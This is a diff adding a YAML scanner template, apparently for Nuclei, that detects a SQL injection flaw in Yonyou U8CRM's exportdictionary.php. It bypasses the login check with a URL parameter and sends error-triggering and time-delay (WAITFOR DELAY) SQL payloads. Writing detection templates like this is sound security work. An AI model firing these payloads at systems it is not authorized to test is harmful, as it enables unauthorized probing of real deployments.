@@ -1,0 +1,50 @@
+id: poc-yaml-yongyon-u8-crm-exportdictionary-php-sqli
+
+info:
+  name: "用友 U8CRM exportdictionary.php SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 用友U8CRM
+  description: |
+    This detects an SQL injection vulnerability in 用友U8CRM exportdictionary.php.
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-database-error
+    method: GET
+    path:
+      - "{{BaseURL}}/devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1%27"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Database error"
+
+  - id: check-time-delay
+    method: GET
+    path:
+      - "{{BaseURL}}/devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1%27;WAITFOR+DELAY+%270:0:5%27--"
+      - "{{BaseURL}}/devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1%27;WAITFOR+DELAY+%270:0:8%27--"
+    headers:
+      Cookie: PHPSESSID=bgsesstimeout-; TL_EXPANDED=REL_STAGE2012
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "delete from"
+      - type: word
+        words:
+          - "<"
+        negative: true
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
